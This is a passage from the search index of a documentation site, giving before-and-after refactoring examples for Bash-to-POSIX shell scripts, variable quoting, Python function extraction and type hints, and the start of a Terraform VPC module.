VERSION=$2\n\n    # Bash arrays\n    declare -a SERVERS=(\"web-01\" \"web-02\" \"web-03\")\n\n    # Bash string manipulation\n    VERSION_NUMBER=${VERSION#v}\n\n    # Process substitution\n    while read -r server; do\n        ssh $server \"systemctl stop ${APP_NAME}\"\n    done &lt; &lt;(printf '%s\\n' \"${SERVERS[@]}\")\n\n    # Bash regex\n    if [[ $VERSION =~ ^v[0-9]+\\.[0-9]+\\.[0-9]+$ ]]; then\n        echo \"Valid version format\"\n    fi\n\n    # Here-string\n    aws s3 cp - s3://bucket/version.txt &lt;&lt;&lt; \"$VERSION\"\n}\n\ndeploy_app \"myapp\" \"v1.2.3\"\n</code></pre> <p>After (POSIX-compliant):</p> <pre><code>#!/bin/sh\n#\n## POSIX-compliant deployment script\n## Compatible with sh, dash, bash, and other POSIX shells\n\nset -eu\n\n## POSIX-compliant functions (no 'function' keyword)\ndeploy_app() {\n    app_name=\"$1\"\n    version=\"$2\"\n\n    # Validate arguments\n    if [ -z \"${app_name}\" ] || [ -z \"${version}\" ]; then\n        printf 'Error: Missing required arguments\\n' &gt;&amp;2\n        return 1\n    fi\n\n    # Use space-separated string instead of array\n    servers=\"web-01 web-02 web-03\"\n\n    # POSIX parameter expansion\n    version_number=\"${version#v}\"\n\n    # POSIX-compliant loop (no process substitution)\n    for server in ${servers}; do\n        printf 'Stopping %s on %s\\n' \"${app_name}\" \"${server}\"\n\n        if ssh \"${server}\" \"systemctl stop ${app_name}\"; then\n            printf '  Stopped successfully\\n'\n        else\n            printf '  Failed to stop\\n' &gt;&amp;2\n            return 1\n        fi\n    done\n\n    # POSIX regex with case statement\n    case \"${version}\" in\n        v[0-9]*.[0-9]*.[0-9]*)\n            printf 'Valid version format: %s\\n' \"${version}\"\n            ;;\n        *)\n            printf 'Invalid version format: %s\\n' \"${version}\" &gt;&amp;2\n            return 1\n            ;;\n    esac\n\n    # POSIX-compliant here-document (no here-string)\n    aws s3 cp - \"s3://bucket/version.txt\" &lt;&lt;EOF\n${version}\nEOF\n\n    return 0\n}\n\n## Main execution\nmain() {\n    if [ $# -ne 2 ]; then\n        printf 'Usage: %s &lt;app-name&gt; &lt;version&gt;\\n' \"$0\" &gt;&amp;2\n        exit 1\n    fi\n\n    deploy_app \"$1\" \"$2\"\n}\n\n## Script entry point\nif [ \"${0##*/}\" = \"$(basename \"${0}\")\" ]; then\n    main \"$@\"\nfi\n</code></pre> <p>Comparison of Features:</p> <pre><code>## Bash vs POSIX\n\n## Function declaration\nfunction bash_func() { ... }     # Bash\nbash_func() { ... }               # POSIX\n\n## Variable declaration\ndeclare -r VAR=\"value\"            # Bash\nreadonly VAR=\"value\"              # POSIX\n\n## Arrays\ndeclare -a arr=(\"a\" \"b\")          # Bash (no POSIX equivalent)\nlist=\"a b c\"                      # POSIX (space-separated)\n\n## String comparison\n[[ \"$a\" == \"$b\" ]]                # Bash\n[ \"$a\" = \"$b\" ]                   # POSIX\n\n## Pattern matching\n[[ \"$str\" =~ ^[0-9]+$ ]]          # Bash\ncase \"$str\" in [0-9]*) ;; esac    # POSIX\n\n## Process substitution\ndiff &lt;(cmd1) &lt;(cmd2)              # Bash\ncmd1 &gt; file1; cmd2 &gt; file2; diff file1 file2  # POSIX\n\n## Here-string\ncmd &lt;&lt;&lt; \"string\"                  # Bash\nprintf '%s\\n' \"string\" | cmd      # POSIX\n\n## Command substitution\noutput=$(command)                 # Bash/POSIX (preferred)\noutput=`command`                  # POSIX (old style)\n</code></pre> <p>Improvements:</p> <ul> <li>\u2705 Compatible with any POSIX shell</li> <li>\u2705 Works on systems without bash</li> <li>\u2705 More portable across Unix systems</li> <li>\u2705 Clearer intent with explicit POSIX features</li> <li>\u2705 Better for embedded systems and minimal environments</li> </ul>","tags":["bash","refactoring","best-practices","examples","shell-scripting"]},{"location":"09_refactoring/bash_refactoring/#improve-variable-quoting","title":"Improve Variable Quoting","text":"","tags":["bash","refactoring","best-practices","examples","shell-scripting"]},{"location":"09_refactoring/bash_refactoring/#problem-unquoted-variables-cause-word-splitting-and-glob-expansion","title":"Problem: Unquoted variables cause word splitting and glob expansion","text":"<p>Before (unsafe quoting):</p> <pre><code>#!/bin/bash\n\nFILE_NAME=\"my document.txt\"\nDIR_PATH=\"/tmp/my files\"\nUSER_INPUT=$1\n\n## Unsafe operations\ncd $DIR_PATH\ncat $FILE_NAME\nrm $USER_INPUT\n\n## Unsafe command substitution\nFILES=$(ls *.txt)\nfor f in $FILES; do\n    echo $f\ndone\n\n## Unsafe in conditionals\nif [ $USER_INPUT = \"admin\" ]; then\n    echo \"Admin user\"\nfi\n\n## Unsafe array expansion\nSERVERS=(web-01 web-02)\nssh ${SERVERS[0]} \"echo $HOME\"\n</code></pre> <p>After (proper quoting):</p> <pre><code>#!/bin/bash\n\nset -euo pipefail\n\nreadonly FILE_NAME=\"my document.txt\"\nreadonly DIR_PATH=\"/tmp/my files\"\nreadonly USER_INPUT=\"${1:-}\"\n\n## Safe operations\ncd \"${DIR_PATH}\"\ncat \"${FILE_NAME}\"\nrm \"${USER_INPUT}\"\n\n## Safe command substitution (use arrays)\nmapfile -t files &lt; &lt;(find . -name \"*.txt\" -type f)\nfor file in \"${files[@]}\"; do\n    echo \"${file}\"\ndone\n\n## Safe conditionals\nif [ \"${USER_INPUT}\" = \"admin\" ]; then\n    echo \"Admin user\"\nfi\n\n## Safe array expansion\ndeclare -a SERVERS=(web-01 web-02)\nssh \"${SERVERS[0]}\" \"echo \\${HOME}\"  # Escape $ to run on remote\n\n## Safe variable defaults\nUSERNAME=\"${2:-default_user}\"\nTIMEOUT=\"${TIMEOUT:-30}\"\n\n## Safe concatenation\nOUTPUT_FILE=\"${DIR_PATH}/${FILE_NAME}.processed\"\n\n## Safe in arithmetic (quotes not needed but ok)\ncount=0\n((count++))\ntotal=$((count + 5))\n\n## Safe globbing\nshopt -s nullglob  # Empty glob returns empty, not literal pattern\nfor log_file in /var/log/*.log; do\n    if [ -f \"${log_file}\" ]; then\n        echo \"Processing: ${log_file}\"\n    fi\ndone\n</code></pre> <p>Quoting Rules Summary:</p> <pre><code>## Always quote:\n\"${variable}\"                 # Variables\n\"${array[@]}\"                 # Array expansion (all elements)\n\"$(command)\"                  # Command substitution\n\"$*\"                          # All positional parameters as single word\n\"$@\"                          # All positional parameters as separate words\n\n## Don't quote:\n$((arithmetic))               # Arithmetic expansion\n$(( $var + 1 ))              # Variables in arithmetic (but ok to quote)\n${#array[@]}                  # Array length\ncase \"$var\" in pattern)       # Patterns in case statements\n\n## Quote unless you explicitly want word splitting:\necho \"${variable}\"            # Correct - preserves spaces\necho ${variable}              # Dangerous - splits on spaces\n\n## Quote in assignments:\nvar=\"${value}\"                # Correct\nvar=${value}                  # Usually works, but quote for consistency\n\n## Always quote empty checks:\nif [ -z \"${var}\" ]; then      # Correct\nif [ -z $var ]; then          # Fails if var is unset\n</code></pre> <p>Improvements:</p> <ul> <li>\u2705 No word splitting on spaces</li> <li>\u2705 No unexpected glob expansion</li> <li>\u2705 Safe handling of empty variables</li> <li>\u2705 Predictable behavior</li> <li>\u2705 Prevents injection vulnerabilities</li> <li>\u2705 Works correctly with special characters</li> </ul>","tags":["bash","refactoring","best-practices","examples","shell-scripting"]},{"location":"09_refactoring/bash_refactoring/#resources","title":"Resources","text":"","tags":["bash","refactoring","best-practices","examples","shell-scripting"]},{"location":"09_refactoring/bash_refactoring/#tools","title":"Tools","text":"<ul> <li>shellcheck: Static analysis for shell scripts</li> <li>shfmt: Shell script formatter</li> <li>bashate: Bash script style checker</li> <li>checkbashisms: Check for bash-specific features</li> </ul>","tags":["bash","refactoring","best-practices","examples","shell-scripting"]},{"location":"09_refactoring/bash_refactoring/#running-shellcheck","title":"Running ShellCheck","text":"<pre><code>## Check a script\nshellcheck script.sh\n\n## Check with specific shell\nshellcheck --shell=bash script.sh\nshellcheck --shell=sh script.sh  # POSIX\n\n## Exclude specific warnings\nshellcheck --exclude=SC2086 script.sh\n\n## Format as JSON\nshellcheck --format=json script.sh\n</code></pre>","tags":["bash","refactoring","best-practices","examples","shell-scripting"]},{"location":"09_refactoring/bash_refactoring/#related-documentation","title":"Related Documentation","text":"<ul> <li>Bash Style Guide</li> <li>Testing Strategies</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-12-06</p>","tags":["bash","refactoring","best-practices","examples","shell-scripting"]},{"location":"09_refactoring/python_refactoring/","title":"Python Refactoring Examples","text":"<p>Real-world examples of refactoring Python code to improve readability, maintainability, and adherence to best practices.</p>","tags":["python","refactoring","best-practices","examples"]},{"location":"09_refactoring/python_refactoring/#extract-function","title":"Extract Function","text":"","tags":["python","refactoring","best-practices","examples"]},{"location":"09_refactoring/python_refactoring/#problem-long-complex-function-doing-multiple-things","title":"Problem: Long, complex function doing multiple things","text":"<p>Before (150 lines, cyclomatic complexity: 18):</p> <pre><code>def process_user_data(user_id):\n    # Fetch user from database\n    conn = psycopg2.connect(DATABASE_URL)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT * FROM users WHERE id = %s\", (user_id,))\n    user_data = cursor.fetchone()\n    cursor.close()\n    conn.close()\n\n    if not user_data:\n        return None\n\n    # Validate email\n    email = user_data[2]\n    if not email or '@' not in email or '.' not in email.split('@')[1]:\n        raise ValueError(\"Invalid email\")\n\n    # Calculate age from birthdate\n    birthdate_str = user_data[5]\n    birth_year = int(birthdate_str.split('-')[0])\n    birth_month = int(birthdate_str.split('-')[1])\n    birth_day = int(birthdate_str.split('-')[2])\n    today = datetime.date.today()\n    age = today.year - birth_year\n    if (today.month, today.day) &lt; (birth_month, birth_day):\n        age -= 1\n\n    # Check subscription status\n    subscription_end = user_data[8]\n    if subscription_end:\n        end_date = datetime.datetime.strptime(subscription_end, '%Y-%m-%d')\n        is_active = end_date &gt; datetime.datetime.now()\n    else:\n        is_active = False\n\n    # Format response\n    response = {\n        'id': user_data[0],\n        'name': user_data[1],\n        'email': email,\n        'age': age,\n        'subscription_active': is_active,\n        'joined_date': user_data[6]\n    }\n\n    return response\n</code></pre> <p>After (well-structured, cyclomatic complexity: 3):</p> <pre><code>from typing import Optional\nfrom datetime import date, datetime\nimport re\n\ndef process_user_data(user_id: int) -&gt; Optional[dict]:\n    \"\"\"Process and format user data from database.\n\n    Args:\n        user_id: The unique user identifier\n\n    Returns:\n        Formatted user data dict, or None if user not found\n\n    Raises:\n        ValueError: If user email is invalid\n    \"\"\"\n    user_data = fetch_user(user_id)\n    if not user_data:\n        return None\n\n    validate_email(user_data['email'])\n\n    return {\n        'id': user_data['id'],\n        'name': user_data['name'],\n        'email': user_data['email'],\n        'age': calculate_age(user_data['birthdate']),\n        'subscription_active': is_subscription_active(user_data['subscription_end']),\n        'joined_date': user_data['joined_date']\n    }\n\ndef fetch_user(user_id: int) -&gt; Optional[dict]:\n    \"\"\"Fetch user from database by ID.\"\"\"\n    with get_db_connection() as conn:\n        cursor = conn.cursor()\n        cursor.execute(\"SELECT * FROM users WHERE id = %s\", (user_id,))\n        row = cursor.fetchone()\n\n    if not row:\n        return None\n\n    return {\n        'id': row[0],\n        'name': row[1],\n        'email': row[2],\n        'birthdate': row[5],\n        'joined_date': row[6],\n        'subscription_end': row[8]\n    }\n\ndef validate_email(email: str) -&gt; None:\n    \"\"\"Validate email format.\n\n    Raises:\n        ValueError: If email format is invalid\n    \"\"\"\n    email_pattern = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$')\n    if not email or not email_pattern.match(email):\n        raise ValueError(f\"Invalid email format: {email}\")\n\ndef calculate_age(birthdate: date) -&gt; int:\n    \"\"\"Calculate age from birthdate.\"\"\"\n    today = date.today()\n    age = today.year - birthdate.year\n    if (today.month, today.day) &lt; (birthdate.month, birthdate.day):\n        age -= 1\n    return age\n\ndef is_subscription_active(subscription_end: Optional[datetime]) -&gt; bool:\n    \"\"\"Check if subscription is currently active.\"\"\"\n    if not subscription_end:\n        return False\n    return subscription_end &gt; datetime.now()\n</code></pre> <p>Improvements:</p> <ul> <li>\u2705 Single Responsibility Principle: Each function does one thing</li> <li>\u2705 Type hints for better IDE support and type checking</li> <li>\u2705 Proper docstrings</li> <li>\u2705 Context manager for database connection</li> <li>\u2705 Regular expression for email validation</li> <li>\u2705 Reduced cyclomatic complexity (18 \u2192 3)</li> <li>\u2705 Improved testability (can test each function independently)</li> </ul>","tags":["python","refactoring","best-practices","examples"]},{"location":"09_refactoring/python_refactoring/#replace-magic-numbers","title":"Replace Magic Numbers","text":"","tags":["python","refactoring","best-practices","examples"]},{"location":"09_refactoring/python_refactoring/#problem-hard-coded-values-throughout-code","title":"Problem: Hard-coded values throughout code","text":"<p>Before:</p> <pre><code>def calculate_shipping(weight, distance):\n    if weight &lt;= 5:\n        base_cost = 10.0\n    elif weight &lt;= 20:\n        base_cost = 25.0\n    else:\n        base_cost = 50.0\n\n    if distance &lt;= 100:\n        distance_cost = distance * 0.5\n    elif distance &lt;= 500:\n        distance_cost = distance * 0.75\n    else:\n        distance_cost = distance * 1.0\n\n    total = base_cost + distance_cost\n\n    if total &gt; 100:\n        total = total * 0.9  # 10% discount\n\n    return round(total, 2)\n</code></pre> <p>After:</p> <pre><code>from dataclasses import dataclass\nfrom typing import ClassVar\n\n@dataclass(frozen=True)\nclass ShippingRates:\n    \"\"\"Shipping rate constants.\"\"\"\n\n    # Weight thresholds (kg)\n    LIGHT_WEIGHT_MAX: ClassVar[float] = 5.0\n    MEDIUM_WEIGHT_MAX: ClassVar[float] = 20.0\n\n    # Base costs by weight category\n    LIGHT_WEIGHT_BASE: ClassVar[float] = 10.0\n    MEDIUM_WEIGHT_BASE: ClassVar[float] = 25.0\n    HEAVY_WEIGHT_BASE: ClassVar[float] = 50.0\n\n    # Distance thresholds (km)\n    SHORT_DISTANCE_MAX: ClassVar[int] = 100\n    MEDIUM_DISTANCE_MAX: ClassVar[int] = 500\n\n    # Distance rates per km\n    SHORT_DISTANCE_RATE: ClassVar[float] = 0.5\n    MEDIUM_DISTANCE_RATE: ClassVar[float] = 0.75\n    LONG_DISTANCE_RATE: ClassVar[float] = 1.0\n\n    # Discounts\n    BULK_DISCOUNT_THRESHOLD: ClassVar[float] = 100.0\n    BULK_DISCOUNT_RATE: ClassVar[float] = 0.10\n\ndef calculate_shipping(weight: float, distance: int) -&gt; float:\n    \"\"\"Calculate shipping cost based on weight and distance.\n\n    Args:\n        weight: Package weight in kilograms\n        distance: Shipping distance in kilometers\n\n    Returns:\n        Total shipping cost with applicable discounts\n    \"\"\"\n    base_cost = _get_base_cost_by_weight(weight)\n    distance_cost = _get_distance_cost(distance)\n    total = base_cost + distance_cost\n\n    return _apply_bulk_discount(total)\n\ndef _get_base_cost_by_weight(weight: float) -&gt; float:\n    \"\"\"Get base shipping cost based on package weight.\"\"\"\n    if weight &lt;= ShippingRates.LIGHT_WEIGHT_MAX:\n        return ShippingRates.LIGHT_WEIGHT_BASE\n    elif weight &lt;= ShippingRates.MEDIUM_WEIGHT_MAX:\n        return ShippingRates.MEDIUM_WEIGHT_BASE\n    else:\n        return ShippingRates.HEAVY_WEIGHT_BASE\n\ndef _get_distance_cost(distance: int) -&gt; float:\n    \"\"\"Calculate cost based on shipping distance.\"\"\"\n    if distance &lt;= ShippingRates.SHORT_DISTANCE_MAX:\n        rate = ShippingRates.SHORT_DISTANCE_RATE\n    elif distance &lt;= ShippingRates.MEDIUM_DISTANCE_MAX:\n        rate = ShippingRates.MEDIUM_DISTANCE_RATE\n    else:\n        rate = ShippingRates.LONG_DISTANCE_RATE\n\n    return distance * rate\n\ndef _apply_bulk_discount(total: float) -&gt; float:\n    \"\"\"Apply bulk discount if threshold is met.\"\"\"\n    if total &gt; ShippingRates.BULK_DISCOUNT_THRESHOLD:\n        discount = total * ShippingRates.BULK_DISCOUNT_RATE\n        total -= discount\n\n    return round(total, 2)\n</code></pre> <p>Improvements:</p> <ul> <li>\u2705 Named constants instead of magic numbers</li> <li>\u2705 Self-documenting code</li> <li>\u2705 Easy to update rates in one place</li> <li>\u2705 Frozen dataclass prevents accidental modification</li> <li>\u2705 Private helper functions for clarity</li> </ul>","tags":["python","refactoring","best-practices","examples"]},{"location":"09_refactoring/python_refactoring/#simplify-complex-conditionals","title":"Simplify Complex Conditionals","text":"","tags":["python","refactoring","best-practices","examples"]},{"location":"09_refactoring/python_refactoring/#problem-nested-ifelse-statements","title":"Problem: Nested if/else statements","text":"<p>Before:</p> <pre><code>def get_user_discount(user):\n    if user.is_premium:\n        if user.years_member &gt; 5:\n            if user.total_purchases &gt; 10000:\n                discount = 0.30\n            else:\n                discount = 0.20\n        else:\n            if user.total_purchases &gt; 5000:\n                discount = 0.15\n            else:\n                discount = 0.10\n    else:\n        if user.years_member &gt; 2:\n            if user.total_purchases &gt; 1000:\n                discount = 0.05\n            else:\n                discount = 0.02\n        else:\n            discount = 0.0\n\n    return discount\n</code></pre> <p>After:</p> <pre><code>from dataclasses import dataclass\nfrom typing import Protocol\n\nclass UserProtocol(Protocol):\n    \"\"\"User interface for discount calculation.\"\"\"\n    is_premium: bool\n    years_member: int\n    total_purchases: float\n\n@dataclass(frozen=True)\nclass DiscountTier:\n    \"\"\"Discount tier with eligibility criteria.\"\"\"\n    min_years: int\n    min_purchases: float\n    discount_rate: float\n\n    def is_eligible(self, user: UserProtocol) -&gt; bool:\n        \"\"\"Check if user meets tier requirements.\"\"\"\n        return (user.years_member &gt;= self.min_years and\n                user.total_purchases &gt;= self.min_purchases)\n\n## Define discount tiers (highest to lowest priority)\nPREMIUM_TIERS = [\n    DiscountTier(min_years=5, min_purchases=10000, discount_rate=0.30),\n    DiscountTier(min_years=5, min_purchases=0, discount_rate=0.20),\n    DiscountTier(min_years=0, min_purchases=5000, discount_rate=0.15),\n    DiscountTier(min_years=0, min_purchases=0, discount_rate=0.10),\n]\n\nSTANDARD_TIERS = [\n    DiscountTier(min_years=2, min_purchases=1000, discount_rate=0.05),\n    DiscountTier(min_years=2, min_purchases=0, discount_rate=0.02),\n    DiscountTier(min_years=0, min_purchases=0, discount_rate=0.0),\n]\n\ndef get_user_discount(user: UserProtocol) -&gt; float:\n    \"\"\"Calculate user discount based on membership and purchase history.\n\n    Args:\n        user: User object with membership details\n\n    Returns:\n        Discount rate as decimal (e.g., 0.15 for 15%)\n    \"\"\"\n    tiers = PREMIUM_TIERS if user.is_premium else STANDARD_TIERS\n\n    for tier in tiers:\n        if tier.is_eligible(user):\n            return tier.discount_rate\n\n    return 0.0\n</code></pre> <p>Improvements:</p> <ul> <li>\u2705 Eliminated nested conditionals</li> <li>\u2705 Data-driven approach (easy to add new tiers)</li> <li>\u2705 Single loop instead of nested ifs</li> <li>\u2705 Self-documenting tier structure</li> <li>\u2705 Easy to test each tier independently</li> </ul>","tags":["python","refactoring","best-practices","examples"]},{"location":"09_refactoring/python_refactoring/#use-list-comprehensions-effectively","title":"Use List Comprehensions Effectively","text":"","tags":["python","refactoring","best-practices","examples"]},{"location":"09_refactoring/python_refactoring/#problem-verbose-loop-based-transformations","title":"Problem: Verbose loop-based transformations","text":"<p>Before:</p> <pre><code>def process_orders(orders):\n    # Filter active orders\n    active_orders = []\n    for order in orders:\n        if order.status == 'active':\n            active_orders.append(order)\n\n    # Extract order IDs\n    order_ids = []\n    for order in active_orders:\n        order_ids.append(order.id)\n\n    # Calculate total values\n    total_values = []\n    for order in active_orders:\n        total = 0\n        for item in order.items:\n            total += item.price * item.quantity\n        total_values.append(total)\n\n    # Find high-value orders\n    high_value_orders = []\n    for i, total in enumerate(total_values):\n        if total &gt; 1000:\n            high_value_orders.append(active_orders[i])\n\n    return high_value_orders\n</code></pre> <p>After:</p> <pre><code>from typing import List, Protocol\nfrom dataclasses import dataclass\n\nclass OrderItem(Protocol):\n    \"\"\"Order item interface.\"\"\"\n    price: float\n    quantity: int\n\nclass Order(Protocol):\n    \"\"\"Order interface.\"\"\"\n    id: str\n    status: str\n    items: List[OrderItem]\n\ndef calculate_order_total(order: Order) -&gt; float:\n    \"\"\"Calculate total value of an order.\"\"\"\n    return sum(item.price * item.quantity for item in order.items)\n\ndef process_orders(orders: List[Order]) -&gt; List[Order]:\n    \"\"\"Filter and return high-value active orders.\n\n    Args:\n        orders: List of orders to process\n\n    Returns:\n        List of active orders with total value &gt; $1000\n    \"\"\"\n    return [\n        order for order in orders\n        if order.status == 'active' and calculate_order_total(order) &gt; 1000\n    ]\n\n## Alternative: If you need the totals separately\ndef process_orders_with_totals(orders: List[Order]) -&gt; List[tuple[Order, float]]:\n    \"\"\"Return high-value active orders with their totals.\n\n    Returns:\n        List of (order, total) tuples for orders &gt; $1000\n    \"\"\"\n    HIGH_VALUE_THRESHOLD = 1000.0\n\n    return [\n        (order, total)\n        for order in orders\n        if order.status == 'active'\n        for total in [calculate_order_total(order)]\n        if total &gt; HIGH_VALUE_THRESHOLD\n    ]\n</code></pre> <p>Improvements:</p> <ul> <li>\u2705 Single comprehension instead of multiple loops</li> <li>\u2705 Eliminated intermediate variables</li> <li>\u2705 More readable and Pythonic</li> <li>\u2705 Named constant for threshold</li> <li>\u2705 Extracted total calculation to reusable function</li> </ul>","tags":["python","refactoring","best-practices","examples"]},{"location":"09_refactoring/python_refactoring/#apply-type-hints","title":"Apply Type Hints","text":"","tags":["python","refactoring","best-practices","examples"]},{"location":"09_refactoring/python_refactoring/#problem-unclear-function-signatures-and-return-types","title":"Problem: Unclear function signatures and return types","text":"<p>Before:</p> <pre><code>def fetch_user_data(user_id, include_orders=False):\n    user = db.get_user(user_id)\n    if not user:\n        return None\n\n    data = {\n        'id': user.id,\n        'name': user.name,\n        'email': user.email\n    }\n\n    if include_orders:\n        data['orders'] = [\n            {'id': o.id, 'total': o.total}\n            for o in user.orders\n        ]\n\n    return data\n\ndef calculate_discount(user, product):\n    if user.premium:\n        return product.price * 0.15\n    return product.price * 0.05\n</code></pre> <p>After:</p> <pre><code>from typing import TypedDict, Optional, List\nfrom decimal import Decimal\n\nclass OrderDict(TypedDict):\n    \"\"\"Order data dictionary structure.\"\"\"\n    id: str\n    total: Decimal\n\nclass UserDataDict(TypedDict, total=False):\n    \"\"\"User data dictionary structure.\n\n    Note: 'orders' is optional (total=False allows missing keys)\n    \"\"\"\n    id: str\n    name: str\n    email: str\n    orders: List[OrderDict]  # Optional field\n\nclass User(Protocol):\n    \"\"\"User domain model protocol.\"\"\"\n    id: str\n    name: str\n    email: str\n    premium: bool\n    orders: List['Order']\n\nclass Order(Protocol):\n    \"\"\"Order domain model protocol.\"\"\"\n    id: str\n    total: Decimal\n\nclass Product(Protocol):\n    \"\"\"Product domain model protocol.\"\"\"\n    price: Decimal\n\ndef fetch_user_data(\n    user_id: str,\n    include_orders: bool = False\n) -&gt; Optional[UserDataDict]:\n    \"\"\"Fetch user data from database.\n\n    Args:\n        user_id: Unique user identifier\n        include_orders: Whether to include order history\n\n    Returns:\n        User data dictionary, or None if user not found\n    \"\"\"\n    user: Optional[User] = db.get_user(user_id)\n    if not user:\n        return None\n\n    data: UserDataDict = {\n        'id': user.id,\n        'name': user.name,\n        'email': user.email\n    }\n\n    if include_orders:\n        data['orders'] = [\n            OrderDict(id=order.id, total=order.total)\n            for order in user.orders\n        ]\n\n    return data\n\ndef calculate_discount(user: User, product: Product) -&gt; Decimal:\n    \"\"\"Calculate discount amount for user on product.\n\n    Args:\n        user: User requesting discount\n        product: Product to discount\n\n    Returns:\n        Discount amount in dollars\n    \"\"\"\n    PREMIUM_DISCOUNT_RATE = Decimal('0.15')\n    STANDARD_DISCOUNT_RATE = Decimal('0.05')\n\n    discount_rate = PREMIUM_DISCOUNT_RATE if user.premium else STANDARD_DISCOUNT_RATE\n    return product.price * discount_rate\n</code></pre> <p>Improvements:</p> <ul> <li>\u2705 Complete type hints for all parameters and returns</li> <li>\u2705 TypedDict for structured dictionaries</li> <li>\u2705 Protocol for duck typing</li> <li>\u2705 Decimal for money calculations</li> <li>\u2705 Better IDE autocomplete and type checking</li> <li>\u2705 Self-documenting function signatures</li> </ul>","tags":["python","refactoring","best-practices","examples"]},{"location":"09_refactoring/python_refactoring/#resources","title":"Resources","text":"","tags":["python","refactoring","best-practices","examples"]},{"location":"09_refactoring/python_refactoring/#tools","title":"Tools","text":"<ul> <li>black: Code formatter</li> <li>isort: Import sorter</li> <li>pylint: Linter for code quality</li> <li>mypy: Static type checker</li> <li>radon: Complexity analyzer</li> </ul>","tags":["python","refactoring","best-practices","examples"]},{"location":"09_refactoring/python_refactoring/#related-documentation","title":"Related Documentation","text":"<ul> <li>Python Style Guide</li> <li>Testing Strategies</li> <li>Python Package Example</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-12-06</p>","tags":["python","refactoring","best-practices","examples"]},{"location":"09_refactoring/terraform_refactoring/","title":"Terraform Refactoring Examples","text":"<p>Real-world examples of refactoring Terraform code to improve maintainability, reusability, and adherence to best practices.</p>","tags":["terraform","refactoring","best-practices","examples","iac"]},{"location":"09_refactoring/terraform_refactoring/#extract-reusable-module","title":"Extract Reusable Module","text":"","tags":["terraform","refactoring","best-practices","examples","iac"]},{"location":"09_refactoring/terraform_refactoring/#problem-repeated-resource-definitions-across-environments","title":"Problem: Repeated resource definitions across environments","text":"<p>Before (separate files for each environment, lots of duplication):</p> <pre><code>## environments/dev/main.tf\nresource \"aws_vpc\" \"main\" {\n  cidr_block           = \"10.0.0.0/16\"\n  enable_dns_hostnames = true\n  enable_dns_support   = true\n\n  tags = {\n    Name        = \"dev-vpc\"\n    Environment = \"dev\"\n    ManagedBy   = \"Terraform\"\n  }\n}\n\nresource \"aws_subnet\" \"private\" {\n  count             = 3\n  vpc_id            = aws_vpc.main.id\n  cidr_block        = \"10.0.${count.index + 1}.0/24\"\n  availability_zone = data.aws_availability_zones.available.names[count.index]\n\n  tags = {\n    Name        = \"dev-private-${count.index + 1}\"\n    Environment = \"dev\"\n    Type        = \"private\"\n  }\n}\n\nresource \"aws_subnet\" \"public\" {\n  count                   = 3\n  vpc_id                  = aws_vpc.main.id\n  cidr_block              = \"10.0.${count.index + 10}.0/24\"\n  availability_zone       = data.aws_availability_zones.available.names[count.index]\n  map_public_ip_on_launch = true\n\n  tags = {\n    Name        = \"dev-public-${count.index + 1}\"\n    Environment = \"dev\"\n    Type        = \"public\"\n  }\n}\n\nresource \"aws_internet_gateway\" \"main\" {\n  vpc_id = aws_vpc.main.id\n\n  tags = {\n    Name        = \"dev-igw\"\n    Environment = \"dev\"\n  }\n}\n\n## ... 100+ more lines of route tables, NAT gateways, etc.\n## Same code repeated in staging/main.tf and production/main.tf\n</code></pre> <p>After (reusable module):</p> <pre><code>## modules/vpc/main.tf\nlocals {\n  common_tags = merge(\n    var.tags,\n    {\n      Environment = var.environment\n      ManagedBy   = \"Terraform\"\n    }\n  )\n}\n\nresource \"aws_vpc\" \"main\" {\n  cidr_block           = var.vpc_cidr\n  enable_dns_hostnames = var.enable_dns_hostnames\n  enable_dns_support   = var.enable_dns_support\n\n  tags = merge(\n    local.common_tags,\n    {\n      Name = \"${var.name}-vpc\"\n    }\n  )\n}\n\nresource \"aws_subnet\" \"private\" {\n  for_each = var.private_subnet_cidrs\n\n  vpc_id            = aws_vpc.main.id\n  cidr_block        = each.value\n  availability_zone = each.key\n\n  tags = merge(\n    local.common_tags,\n    {\n      Name = \"${var.name}-private-${each.key}\"\n      Type = \"private\"\n    }\n  )\n}\n\nresource \"aws_subnet\" \"public\" {\n  for_each = var.public_subnet_cidrs\n\n  vpc_id                  = aws_vpc.main.id\n  cidr_block              = each.value\n  availability_zone       = each.key\n  map_public_ip_on_launch = var.map_public_ip_on_launch\n\n  tags = merge(\n    local.common_tags,\n    {\n      Name = \"${var.name}-public-${each.key}\"\n      Type = \"public\"\n    }\n  )\n}\n\n## modules/vpc/variables.tf\nvariable \"name\" {\n  description = \"Name prefix for VPC resources\"\n  type        = string\n}\n\nvariable \"environment\" {\n  description = \"Environment name\"\n  type        = string\n}\n\nvariable \"vpc_cidr\" {\n  description = \"CIDR block for VPC\"\n  type        = string\n}\n\nvariable \"private_subnet_cidrs\" {\n  description = \"Map of AZ to CIDR for private subnets\"\n  type        = map(string)\n}\n\nvariable \"public_subnet_cidrs\" {\n  description = \"Map of AZ to CIDR for public subnets\"\n  type        = map(string)\n}\n\nvariable \"enable_dns_hostnames\" {\n  description = \"Enable DNS hostnames in VPC\"\n  type        = bool\n  default     = true\n}\n\nvariable \"enable_dns_support\" {\n  description = \"Enable DNS support in VPC\"\n  type        = bool\n  default     = true\n}\n\nvariable \"map_public_ip_on_launch\" {\n  description = \"Map public IP on launch for public subnets\"\n  type        = bool\n  default     = true\n}\n\nvariable \"tags\" {\n  description = \"Additional tags for resources\"\n  type        = map(string)\n  default     = {}\n}\n\n## environments/dev/main.tf (now much simpler)\nmodule \"vpc\" {\n  source = \"../../modules/vpc\"\n\n  name        = \"dev\"\n  environment = \"dev\"\n  vpc_cidr    = \"10.0.0.0/16\"\n\n  private_subnet_cidrs = {\n    \"us-east-1a\" = \"10.0.1.0/24\"\n    \"us-east-1b\" = \"10.0.2.0/24\"\n    \"us-east-1c\" = \"10.0.3.0/24\"\n  }\n\n  public_subnet_cidrs = {\n    \"us-east-1a\" = \"10.0.10.0/24\"\n    \"us-east-1b\" = \"10.0.11.0/24\"\n    \"us-east-1c\" = \"10.0.12.0/24\"\n  }\n\n  tags = {\n    Project = \"my-project\"\n  }\n}\n</code></pre> <p>Improvements:</p> <ul> <li>\u2705 DRY: VPC code defined once, reused across environments</li> <li>\u2705 Maintainability: Bug fixes and updates in one place</li> <li>\u2705 Consistency: All environments use same battle-tested module</li> <li>\u2705 Reduced lines: ~400 lines \u2192 ~50 lines per environment</li> <li>\u2705 